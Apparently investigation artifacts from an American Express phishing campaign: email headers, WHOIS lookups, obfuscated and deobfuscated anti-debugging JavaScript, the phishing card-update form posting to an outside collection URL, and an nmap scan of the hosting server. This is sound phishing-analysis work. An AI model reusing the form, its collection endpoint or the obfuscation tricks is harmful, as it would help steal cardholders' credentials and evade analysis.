@@ -1,0 +1,405 @@
+===== Artifact 1 (text) =====
+
+X-Apparently-To: jonluca.decaro@yahoo.com; Sat, 02 Feb 2019 22:19:06 +0000
+Return-Path: <onlineservices@member.amexmessages.com>
+Received-SPF: pass (domain of member.amexmessages.com designates 63.101.151.8 as permitted sender)
+X-YMailISG: <redacted-blob>
+X-Originating-IP: [63.101.151.8]
+Authentication-Results: mta4396.mail.ne1.yahoo.com  from=member.amexmessages.com; dkim=neutral (no sig)
+Received: from 127.0.0.1  (EHLO dalexmm06.acs-inc.com) (63.101.151.8)
+  by mta4396.mail.ne1.yahoo.com with SMTPS; Sat, 02 Feb 2019 22:19:04 +0000
+X-IronPort-AV: E=Sophos;i="5.56,554,1539666000";
+   d="html'217?scan'217,208,217";a="259792081"
+Received: from unknown (HELO AWS12239ESMTP.local) ([63.87.170.72])
+  by dalexmm06.acs-inc.com with ESMTP; 02 Feb 2019 16:18:36 -0600
+From: "American Express" <onlineservices@member.amexmessages.com>
+To: onlineservices@member.amexmessages.com
+Subject: RREMINDER: We've issue a concern
+Date: Sat, 2 Feb 2019 16:18:35 -0600
+MIME-Version: 1.0
+Message-ID: <15491450801506f17db7902914ccdbc1fa05e7d621_1385@member.amexmessages.com>
+Content-Type: multipart/mixed; boundary="--=_Next_E459_20190124_EC12.0.12.2626"
+Content-Length: 11166
+
+===== Artifact 2 (text) =====
+
+Domain Name: AMEXMESSAGES.COM
+Registry Domain ID: 2352774515_DOMAIN_COM-VRSN
+Registrar WHOIS Server: whois.PublicDomainRegistry.com
+Registrar URL: http://www.publicdomainregistry.com
+Updated Date: 2019-01-16T11:28:08Z
+Creation Date: 2019-01-16T11:28:07Z
+Registry Expiry Date: 2020-01-16T11:28:07Z
+Registrar: PDR Ltd. d/b/a PublicDomainRegistry.com
+Registrar IANA ID: 303
+Registrar Abuse Contact Email: abuse-contact@publicdomainregistry.com
+Registrar Abuse Contact Phone: +1.2013775952
+Domain Status: clientTransferProhibited https://icann.org/epp#clientTransferProhibited
+Name Server: MONOVM.EARTH.ORDERBOX-DNS.COM
+Name Server: MONOVM.MARS.ORDERBOX-DNS.COM
+Name Server: MONOVM.MERCURY.ORDERBOX-DNS.COM
+Name Server: MONOVM.VENUS.ORDERBOX-DNS.COM
+DNSSEC: unsigned
+URL of the ICANN Whois Inaccuracy Complaint Form: https://www.icann.org/wicf/
+
+===== Artifact 3 (js) =====
+
+"use strict";
+/** @type {!Array} */
+var a = [
+  "elPaf",
+  "MpKsb",
+  "Lyfyb",
+  "WchjA",
+  "apply",
+  "xkowf",
+  "function *\\( *\\)",
+  "\\+\\+ *(?:_0x(?:[a-f0-9]){4,6}|(?:\\b|\\d)[a-z0-9]{1,4}(?:\\b|\\d))",
+  "init",
+  "test",
+  "chain",
+  "input",
+  "<giant blob>",
+  "length",
+  "write",
+  "string",
+  "constructor",
+  "while (true) {}",
+  "counter",
+  "SteWJ",
+  "WlTUB",
+  "debu",
+  "gger",
+  "call",
+  "stateObject",
+  "oHeJH",
+];
+/**
+ * @param {string} e
+ * @param {?} dt
+ * @return {?}
+ */
+var b = function (e, dt) {
+  /** @type {number} */
+  e = e - 0;
+  var ret = a[e];
+  return ret;
+};
+var d = (function () {
+  /** @type {boolean} */
+  var p = !![];
+  return function (value, deferred) {
+    /** @type {!Function} */
+    var mac = p
+      ? function () {
+          if (b("0x0") === b("0x1")) {
+            debuggerProtection(0);
+          } else {
+            if (deferred) {
+              if (b("0x2") === b("0x3")) {
+                return ![];
+              } else {
+                var mom = deferred[b("0x4")](value, arguments);
+                /** @type {null} */
+                deferred = null;
+                return mom;
+              }
+            }
+          }
+        }
+      : function () {};
+    /** @type {boolean} */
+    p = ![];
+    return mac;
+  };
+})();
+(function () {
+  d(this, function () {
+    if (b("0x5") !== b("0x5")) {
+      f("0");
+    } else {
+      /** @type {!RegExp} */
+      var n = new RegExp(b("0x6"));
+      /** @type {!RegExp} */
+      var inlineAttributeCommentRegex = new RegExp(b("0x7"), "i");
+      var f = c(b("0x8"));
+      if (!n[b("0x9")](f + b("0xa")) || !inlineAttributeCommentRegex[b("0x9")](f + b("0xb"))) {
+        f("0");
+      } else {
+        c();
+      }
+    }
+  })();
+})();
+var i;
+var t = b("0xc");
+/** @type {string} */
+var x = "";
+/** @type {number} */
+i = 0;
+for (; i < t[b("0xd")]; i = i + 3) {
+  /** @type {string} */
+  x = x + unescape("%" + t["substr"](i, 2));
+}
+document[b("0xe")](x);
+/**
+ * @param {?} fnArgs
+ * @return {?}
+ */
+function c(fnArgs) {
+  /**
+   * @param {number} i
+   * @return {?}
+   */
+  function f(i) {
+    if (typeof i === b("0xf")) {
+      return function (canCreateDiscussions) {}[b("0x10")](b("0x11"))[b("0x4")](b("0x12"));
+    } else {
+      if (("" + i / i)[b("0xd")] !== 1 || i % 20 === 0) {
+        if (b("0x13") === b("0x14")) {
+          return function (canCreateDiscussions) {}[b("0x10")](b("0x11"))[b("0x4")]("counter");
+        } else {
+          (function () {
+            return !![];
+          })
+            [b("0x10")](b("0x15") + b("0x16"))
+            [b("0x17")]("action");
+        }
+      } else {
+        (function () {
+          return ![];
+        })
+          [b("0x10")]("debu" + b("0x16"))
+          [b("0x4")](b("0x18"));
+      }
+    }
+    f(++i);
+  }
+  try {
+    if (fnArgs) {
+      if ("oHeJH" !== b("0x19")) {
+        x = x + unescape("%" + t["substr"](i, 2));
+      } else {
+        return f;
+      }
+    } else {
+      f(0);
+    }
+  } catch (H) {}
+}
+
+===== Artifact 4 (js) =====
+
+/**
+ * @param {?} fnArgs
+ * @return {?}
+ */
+function c(fnArgs) {
+  /**
+   * @param {number} i
+   * @return {?}
+   */
+  function f(i) {
+    if (typeof i === "string") {
+      return function (canCreateDiscussions) {}["constructor"]("while (true) {}")["apply"]("counter");
+    } else {
+      if (("" + i / i)["length"] !== 1 || i % 20 === 0) {
+        if ("SteWJ" === "WlTUB") {
+          return function (canCreateDiscussions) {}["constructor"]("while (true) {}")["apply"]("counter");
+        } else {
+          (function () {
+            return true;
+          })
+            ["constructor"]("debu" + "gger")
+            ["call"]("action");
+        }
+      } else {
+        (function () {
+          return false;
+        })
+          ["constructor"]("debu" + "gger")
+          ["apply"]("stateObject");
+      }
+    }
+    f(++i);
+  }
+
+  try {
+    if (fnArgs) {
+      if ("oHeJH" !== "oHeJH") {
+        decrypted = decrypted + unescape("%" + payload["substr"](i, 2));
+      } else {
+        return f;
+      }
+    } else {
+      f(0);
+    }
+  } catch (H) {}
+}
+
+===== Artifact 5 (js) =====
+
+var functionGenerator = (function () {
+  /** @type {boolean} */
+  var isFirstRun = true;
+  return function (deferredFunctionObjectProperties, deferredFunction) {
+    /** @type {!Function} */
+    var funcToReturn = isFirstRun
+      ? function () {
+          if ("elPaf" === "MpKsb") {
+            debuggerProtection(0);
+          } else {
+            if (deferredFunction) {
+              if ("Lyfyb" === "WchjA") {
+                return false;
+              } else {
+                var functionResult = deferredFunction["apply"](deferredFunctionObjectProperties, arguments);
+                /** @type {null} */
+                deferredFunction = null;
+                return functionResult;
+              }
+            }
+          }
+        }
+      : function () {};
+    /** @type {boolean} */
+    isFirstRun = false;
+    return funcToReturn;
+  };
+})();
+
+===== Artifact 6 (js) =====
+
+(function () {
+  functionGenerator(this, function () {
+    if ("xkowf" !== "xkowf") {
+      f("0");
+    } else {
+      /** @type {!RegExp} */
+      var n = new RegExp("function *\\( *\\)");
+      /** @type {!RegExp} */
+      var inlineAttributeCommentRegex = new RegExp("++ *(?:_0x(?:[a-f0-9]){4,6}|(?:\b|d)[a-z0-9]{1,4}(?:\b|d))", "i");
+      var f = c("init");
+      if (!n["test"](f + "chain") || !inlineAttributeCommentRegex["test"](f + "input")) {
+        f("0");
+      } else {
+        c();
+      }
+    }
+  })();
+})();
+
+===== Artifact 7 (html) =====
+
+<form
+  name="0"
+  id="0"
+  action="http://souzoku-roots.com/gzipdb/data.php"
+  autocomplete="off"
+  method="post"
+>
+  <div className={"fuidformContent clearfix"}>
+    <div className={"formHeader clearfix"}>
+      <h1 tabindex="0">Cardmembership | Update</h1>
+      <span
+        ><img
+          id="secureImage"
+          src="http://209.160.59.204/css/fonts/spacer.png"
+          alt="This is a secure page"
+          title="This is a secure page"
+          tabindex="0"
+      /></span>
+    </div>
+    <div className={"startingStep"}>1. Enter Profile Details</div>
+    <div className={"clearfix fuidNav"}>
+      <div className={"active normal identyWidth"} tabindex="0">
+        <span className={"normalText"}>1. Enter Profile Details</span>
+        <span className={"activeArrow"}></span>
+      </div>
+      <div className={"normal retriveIdWidth"}>
+        <span className={"normalText"}>2. Done!</span>
+        <span className={"normalArrow"}></span>
+      </div>
+    </div>
+    <div className={"clear"}></div>
+    <div className={"headerHelpText"} tabindex="0">
+      A simple validation process to quickly you as possible. First we need to
+      confirm your profile details. All Fields Required *.
+    </div>
+    <div className={"hide"} id="serverSiderErr">
+      <div className={"serverSiderErrInner"}>
+        <span className={"errorIcon"}></span>
+        <span id="serverErrMsg"></span>
+      </div>
+    </div>
+    ...
+  </div>
+</form>
+
+===== Artifact 8 (text) =====
+
+Domain Name: souzoku-roots.com
+Registry Domain ID: 1648600398_DOMAIN_COM-VRSN
+Registrar WHOIS Server: whois.discount-domain.com
+Registrar URL: http://www.onamae.com
+Updated Date: 2018-03-30T00:00:00Z
+Creation Date: 2011-04-01T00:00:00Z
+Registrar Registration Expiration Date: 2019-04-01T00:00:00Z
+Registrar: GMO INTERNET, INC.
+Registrar IANA ID: 49
+Registrar Abuse Contact Email: abuse@gmo.jp
+Registrar Abuse Contact Phone: +81.337709199
+Domain Status: ok https://icann.org/epp#ok
+Registry Registrant ID: Not Available From Registry
+Registrant Name: <censored>
+Registrant Organization: <censored>
+Registrant Street: <censored>
+Registrant Street: <censored>
+Registrant City: <censored>
+Registrant State/Province: <censored>
+Registrant Postal Code: <censored>
+Registrant Country: JP
+Registrant Phone: <censored>
+Registrant Phone Ext:
+Registrant Fax: <censored>
+Registrant Fax Ext:
+Registrant Email: <censored>
+
+===== Artifact 9 (text) =====
+
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-02 18:36 PST
+PORT     STATE    SERVICE            VERSION
+21/tcp   open     ftp                ProFTPD 1.3.1
+22/tcp   open     ssh                OpenSSH 4.3 (protocol 2.0)
+53/tcp   open     domain             ISC BIND 9.3.4-P1
+80/tcp   open     http               Apache httpd 2.2.3 ((CentOS))
+110/tcp  open     pop3               Courier pop3d
+143/tcp  open     imap               Courier Imapd (released 2004)
+443/tcp  open     ssl/http           Apache httpd 2.2.3 ((CentOS))
+465/tcp  open     ssl/smtp           qmail smtpd
+587/tcp  open     smtp               qmail smtpd
+993/tcp  open     ssl/imap           Courier Imapd (released 2004)
+995/tcp  open     ssl/pop3           Courier pop3d
+3306/tcp open     mysql              MySQL 5.0.45
+| mysql-info:
+|   Protocol: 10
+|   Version: 5.0.45
+|   Thread ID: 27774186
+|   Capabilities flags: 41516
+|   Some Capabilities: SupportsTransactions, Speaks41ProtocolNew, Support41Auth, SupportsCompression, LongColumnFlag, ConnectWithDatabase
+|   Status: Autocommit
+|_  Salt: >cZuafZrOtz(UU,v11?-
+8443/tcp open     ssl/http           Apache httpd
+|_http-server-header: Apache
+| http-title:           VZPP Plesk - Plesk 8.6.0 \xE3\x81\xAB\xE3\x83\xAD\xE3\x82\xB0\xE3\x82\xA4\xE3\x83\xB3
+|_Requested resource was https://pck.bonyari.jp:8443/vz/cp/panel/plesk/frameset
+| ssl-cert: Subject: organizationName=Parallels, Inc./stateOrProvinceName=VA/countryName=US
+| Not valid before: 2015-02-15T14:20:29
+|_Not valid after:  2016-02-15T14:20:29
+|_ssl-date: 2019-02-03T02:37:25+00:00; 0s from scanner time.
+Device type: general purpose
+Running: Linux 2.6.X|3.X
+OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
+OS details: Linux 2.6.32 - 3.13
+Network Distance: 17 hops
+Service Info: Hosts: localhost.localdomain, vz170.jpnsv.com; OS: Unix
